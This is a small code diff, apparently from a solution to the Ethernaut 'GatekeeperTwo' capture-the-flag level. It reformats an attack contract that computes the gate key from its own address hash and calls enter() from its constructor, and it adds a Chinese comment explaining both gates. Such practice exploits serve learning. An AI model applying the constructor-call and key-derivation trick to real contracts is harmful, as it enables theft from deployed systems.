@@ -30,13 +30,15 @@ contract GatekeeperTwo {
 
 contract hack {
 
-    address levelInstance;
+  address levelInstance;
 
-    constructor(address _levelInstance) {
-      levelInstance = _levelInstance;
-      unchecked {
+  constructor(address _levelInstance) {
+    levelInstance = _levelInstance;
+    unchecked {
       bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
       GatekeeperTwo(levelInstance).enter(key);
-      }
     }
+  }
 }
+
+//第一个门以其他合约调用，第二个门使用构造函数
